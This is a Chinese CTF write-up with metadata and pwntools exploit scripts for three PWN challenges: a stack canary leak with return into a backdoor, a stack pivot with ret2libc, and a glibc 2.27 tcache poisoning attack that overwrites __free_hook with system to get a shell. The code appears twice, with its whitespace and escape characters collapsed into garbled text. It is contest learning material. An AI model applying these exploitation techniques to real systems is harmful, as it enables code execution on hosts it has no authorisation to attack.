---
title: F.Z.N CTF网络安全大赛PWN方向题解
contest: F.Z.N CTF
year: 2024
difficulty: medium
vuln_type: heap_exploit
tags:
- pwn
- canary
- stack-pivoting
- tcache-poisoning
- i386
- amd64
- ret2libc
attack_chain:
- '题1 canary (i386): 栈溢出覆盖返回backdoor(0x8049285)'
- '泄露canary: A*0x64+B 接收到\x00+3字节'
- '题2 stack_pivoting_x64: 栈迁移leave_ret'
- '泄露栈地址: A*0x28+B*8接收6字节'
- rsp_addr=stack_leak-0x40
- '题3 attachment 堆题: tcache poisoning'
- 0x418+0x20unsorted bin leak libc (libc2.27 main_arena+96=0x3ebca0)
- tcache 0x68改fd指向__free_hook
- 分配两次第二次覆盖__free_hook=system
- delete带/bin/sh的chunk触发system
key_payload: 'edit(4, p64(__free_hook)); add(0x68, p64(system)); delete(7)  # /bin/sh'
one_liner: F.Z.N PWN 3题：canary爆破+stack_pivoting+tcache poisoning
lesson: 栈迁移rsp=leak-0x40+leave_ret；tcache改fd指向__free_hook
quality: high
full_path: F.Z.N_CTF网络安全大赛PWN方向题解.full.md
meta_path: F.Z.N_CTF网络安全大赛PWN方向题解.meta.md
images_removed: true
images_removed_count: 9
schema_version: v3.0.0-P0
summary: 'F.Z.N CTF网络安全大赛PWN方向题解。F.Z.N PWN 3题：canary爆破+stack_pivoting+tcache poisoning。关键路径：题1 canary (i386): 栈溢出覆盖返回backdoor(0x8049285) → 泄露canary: A*0x64+B 接收到\x00+3字节 → 题2 stack_pivoting_x64: 栈迁移leave_re...'
category: pwn
subcategory: heap_exploitation
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 9
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/282169.html
reasoning_chain:
- 触发点：题1 i386 canary 题 → 假设：canary 末尾 0x00 可爆破
- 动作：send 'A'*0x64 + 'B' → recv 末尾 → 观察：canary 最低字节 0x00 后 3 字节泄露
- 假设：循环 256 次爆破 3 字节 → 动作：可任意爆破 → 观察：canary 还原
- 动作：payload = 'a'*0x64 + canary + 'deadbeef'*3 + backdoor(0x8049285) → 观察：跳入 backdoor
- '题2 stack_pivoting x64: 栈迁移 leave; ret → 动作：先泄露栈地址'
- 假设：send 'A'*0x28 + 'B'*8 → recv 6 字节栈地址 → 观察：rsp_addr = stack_leak - 0x40
- 动作：payload = p64(0) + pop_rdi + puts_got + puts_plt + main + rsp_addr + leave_ret → 观察：泄 libc
- 题3 attachment 堆题 glibc 2.27 tcache → 假设：unsorted bin 泄露 libc
- 动作：add(0x418) + add(0x20) + delete(0) + show(0) → 观察：main_arena+96 = 0x3ebca0
- 动作：libc_base = leak - 0x3ebca0; __free_hook = base + 0x3ed8e8; system = base + 0x4f420
- 动作：add(0x68)*2 + delete(4) + edit(4, p64(__free_hook)) + add(0x68)*2 (覆盖为 system)
- 动作：add(0x20, '/bin/sh\x00') + delete(7) → system('/bin/sh') → 完成
failed_attempts:
- 题1 一次性爆破全部 canary → 失败：必须按字节逐个爆破（依赖 0x00 截断）
- 题2 直接覆盖 ret addr → 失败：栈迁移必须先泄露栈位置
- 题3 用 fastbin attack → 失败：glibc 2.27 优先用 tcache poisoning
key_observations:
- canary 爆破利用末尾 \x00 截断 + 字节级泄露
- stack_pivoting 核心：leave; ret 把 rbp → rsp + pop rbp
- tcache poisoning：edit freed chunk 的 fd → 分配两次拿到任意地址
- glibc 2.27 tcache 无 double-free 检测（2.29+ 加入 key 字段）
- __free_hook → system 是 2.27 经典 ret2libc 替代
prerequisites:
- glibc heap 基础（tcache/fastbin/unsorted bin）
- canary 泄漏原理（0x00 截断）
- ROP 链构造（pop rdi; ret / leave; ret）
- pwntools 常用 API（ELF/LibcSearcher）
---
# F.Z.N CTF网络安全大赛PWN方向题解

> 原文: https://www.ctfiot.com/282169.html
> ID: 282169

frompwnimport*frompwncliimport*fromLibcSearcherimport*context(log_level ='debug', arch ='i386', os ='linux')p = remote('nc1.ctfplus.cn',31923)elf = ELF('./canary')#libc=ELF('/home/ubuntu/Desktop/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6')defdebug(): gdb.attach(p) pause()backdoor =0x8049285payload =b'A'*0x64+b'B'p.sendafter(b'number?n', payload)p.recvuntil(b'AB')canary = u32(b'x00'+p.recv(3))payload =b'a'*0x64+p32(canary)+p32(0xdeadbeef)*3+p32(backdoor)p.send(payload)p.interactive()

frompwnimport*frompwncliimport*fromLibcSearcherimport*context(log_level ='debug', arch ='amd64', os ='linux')p = remote('nc1.ctfplus.cn',47592)#p=process('./stack_pivotingx64')#p=gdb.debug('./stack_pivotingx64','b vuln')elf = ELF('./stack_pivotingx64')#libc=ELF('/home/ubuntu/Desktop/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6')defdebug(): gdb.attach(p) pause()payload =b'A'*0x28+b'B'*0x8p.sendafter(b'namenn', payload)p.recvuntil(b'ABBBBBBBB')stack_leak = u64(p.recv(6).ljust(8,b'x00'))print(hex(stack_leak))rsp_addr = stack_leak-0x40leave_ret =0x401256pop_rdi_ret =0x401275ret_addr =0x40101aputs_got = elf.got['puts']puts_plt = elf.plt['puts']main_addr = elf.sym['main']payload = p64(0xdeadbeef)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)+p64(0xdeadbeef)+p64(rsp_addr)+p64(leave_ret)p.sendlineafter(b'messagenn', payload)puts_addr = u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))libc = LibcSearcher('puts', puts_addr)libc_base = puts_addr - libc.dump('puts')system = libc_base + libc.dump('system')binsh = libc_base + libc.dump('str_bin_sh')payload =b'A'*0x28+b'B'*0x8p.sendafter(b'namenn', payload)p.recvuntil(b'ABBBBBBBB')stack_leak = u64(p.recv(6).ljust(8,b'x00'))print(hex(stack_leak))rsp_addr = stack_leak-0x40payload = p64(0xdeadbeef)+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh)+p64(system)+p64(main_addr)+p64(rsp_addr)+p64(leave_ret)p.sendlineafter(b'messagenn', payload)p.interactive()

frompwnimport*frompwncliimport*fromLibcSearcherimport*context(log_level ='debug', arch ='amd64', os ='linux')p = remote('nc1.ctfplus.cn',20491)#p=process('./attachment')#p=gdb.debug('./attachment','b vuln')elf = ELF('./attachment')#libc=ELF('/home/ubuntu/Desktop/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6')defdebug(): gdb.attach(p) pause()defadd(size, content): p.sendlineafter(b'5. exit',b'1') p.sendlineafter(b'size?',str(size).encode()) iflen(content) < size: content = content.ljust(size,b'x00') p.sendafter(b'content:', content)defdelete(idx): p.sendlineafter(b'5. exit',b'2') p.sendlineafter(b'idx?',str(idx).encode())defshow(idx): p.sendlineafter(b'5. exit',b'3') p.sendlineafter(b'idx?',str(idx).encode()) p.recvuntil(b'content: ') returnp.recvline(keepends=False)defedit(idx, content): p.sendlineafter(b'5. exit',b'4') p.sendlineafter(b'idx?',str(idx).encode()) p.sendafter(b'content:', content)
# 步骤1: 泄露libc地址 - 使用unsorted bin
# 分配一个较大的chunk，使其释放后进入unsorted binadd(0x418,b'A'*8) # 块0 - 使用0x418大小(实际chunk大小0x420+0x10=0x430)add(0x20,b'B'*8) # 块1 - 防止合并delete(0) # 释放块0到unsorted bin
# 显示块0来泄露libc地址data = show(0)leak = u64(data[:8].ljust(8,b'x00'))log.info(f"Leaked address: 0x{leak:x}")
# 计算libc基址（基于libc2.27）libc_base = leak -0x3ebca0
# main_arena+96的偏移log.info(f"Libc base: 0x{libc_base:x}")
# 计算__free_hook和system地址__free_hook = libc_base +0x3ed8e8system = libc_base +0x4f420log.info(f"__free_hook: 0x{__free_hook:x}")log.info(f"system: 0x{system:x}")
# 重新分配块0，避免后续干扰add(0x418,b'C'*8) # 块0重新分配
# 步骤2: 更简洁的tcache poisoning攻击
# 只分配2个相同大小的chunkadd(0x68,b'D'*8) # 块2add(0x68,b'E'*8) # 块3
# 释放块2到tcachedelete(4)
# 修改块2的fd指针指向__free_hookedit(4, p64(__free_hook))
# 分配两次，第一次得到原来的块2，第二次得到__free_hookadd(0x68,b'F'*8) # 块4 (实际上是原来的块2)add(0x68, p64(system)) # 块5 - 覆盖__free_hook为system
# 步骤3: 触发system("/bin/sh")add(0x20,b'/bin/shx00') # 块6delete(7) # 触发__free_hook，执行system("/bin/sh")p.interactive()


```
frompwnimport*frompwncliimport*fromLibcSearcherimport*context(log_level ='debug', arch ='i386', os ='linux')p = remote('nc1.ctfplus.cn',31923)elf = ELF('./canary')#libc=ELF('/home/ubuntu/Desktop/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6')defdebug(): gdb.attach(p) pause()backdoor =0x8049285payload =b'A'*0x64+b'B'p.sendafter(b'number?n', payload)p.recvuntil(b'AB')canary = u32(b'x00'+p.recv(3))payload =b'a'*0x64+p32(canary)+p32(0xdeadbeef)*3+p32(backdoor)p.send(payload)p.interactive()
frompwnimport*frompwncliimport*fromLibcSearcherimport*context(log_level ='debug', arch ='amd64', os ='linux')p = remote('nc1.ctfplus.cn',47592)#p=process('./stack_pivotingx64')#p=gdb.debug('./stack_pivotingx64','b vuln')elf = ELF('./stack_pivotingx64')#libc=ELF('/home/ubuntu/Desktop/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6')defdebug(): gdb.attach(p) pause()payload =b'A'*0x28+b'B'*0x8p.sendafter(b'namenn', payload)p.recvuntil(b'ABBBBBBBB')stack_leak = u64(p.recv(6).ljust(8,b'x00'))print(hex(stack_leak))rsp_addr = stack_leak-0x40leave_ret =0x401256pop_rdi_ret =0x401275ret_addr =0x40101aputs_got = elf.got['puts']puts_plt = elf.plt['puts']main_addr = elf.sym['main']payload = p64(0xdeadbeef)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)+p64(0xdeadbeef)+p64(rsp_addr)+p64(leave_ret)p.sendlineafter(b'messagenn', payload)puts_addr = u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))libc = LibcSearcher('puts', puts_addr)libc_base = puts_addr - libc.dump('puts')system = libc_base + libc.dump('system')binsh = libc_base + libc.dump('str_bin_sh')payload =b'A'*0x28+b'B'*0x8p.sendafter(b'namenn', payload)p.recvuntil(b'ABBBBBBBB')stack_leak = u64(p.recv(6).ljust(8,b'x00'))print(hex(stack_leak))rsp_addr = stack_leak-0x40payload = p64(0xdeadbeef)+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh)+p64(system)+p64(main_addr)+p64(rsp_addr)+p64(leave_ret)p.sendlineafter(b'messagenn', payload)p.interactive()
frompwnimport*frompwncliimport*fromLibcSearcherimport*context(log_level ='debug', arch ='amd64', os ='linux')p = remote('nc1.ctfplus.cn',20491)#p=process('./attachment')#p=gdb.debug('./attachment','b vuln')elf = ELF('./attachment')#libc=ELF('/home/ubuntu/Desktop/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6')defdebug(): gdb.attach(p) pause()defadd(size, content): p.sendlineafter(b'5. exit',b'1') p.sendlineafter(b'size?',str(size).encode()) iflen(content) < size: content = content.ljust(size,b'x00') p.sendafter(b'content:', content)defdelete(idx): p.sendlineafter(b'5. exit',b'2') p.sendlineafter(b'idx?',str(idx).encode())defshow(idx): p.sendlineafter(b'5. exit',b'3') p.sendlineafter(b'idx?',str(idx).encode()) p.recvuntil(b'content: ') returnp.recvline(keepends=False)defedit(idx, content): p.sendlineafter(b'5. exit',b'4') p.sendlineafter(b'idx?',str(idx).encode()) p.sendafter(b'content:', content)
# 步骤1: 泄露libc地址 - 使用unsorted bin
# 分配一个较大的chunk，使其释放后进入unsorted binadd(0x418,b'A'*8) # 块0 - 使用0x418大小(实际chunk大小0x420+0x10=0x430)add(0x20,b'B'*8) # 块1 - 防止合并delete(0) # 释放块0到unsorted bin
# 显示块0来泄露libc地址data = show(0)leak = u64(data[:8].ljust(8,b'x00'))log.info(f"Leaked address: 0x{leak:x}")
# 计算libc基址（基于libc2.27）libc_base = leak -0x3ebca0
# main_arena+96的偏移log.info(f"Libc base: 0x{libc_base:x}")
# 计算__free_hook和system地址__free_hook = libc_base +0x3ed8e8system = libc_base +0x4f420log.info(f"__free_hook: 0x{__free_hook:x}")log.info(f"system: 0x{system:x}")
# 重新分配块0，避免后续干扰add(0x418,b'C'*8) # 块0重新分配
# 步骤2: 更简洁的tcache poisoning攻击
# 只分配2个相同大小的chunkadd(0x68,b'D'*8) # 块2add(0x68,b'E'*8) # 块3
# 释放块2到tcachedelete(4)
# 修改块2的fd指针指向__free_hookedit(4, p64(__free_hook))
# 分配两次，第一次得到原来的块2，第二次得到__free_hookadd(0x68,b'F'*8) # 块4 (实际上是原来的块2)add(0x68, p64(system)) # 块5 - 覆盖__free_hook为system
# 步骤3: 触发system("/bin/sh")add(0x20,b'/bin/shx00') # 块6delete(7) # 触发__free_hook，执行system("/bin/sh")p.interactive()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]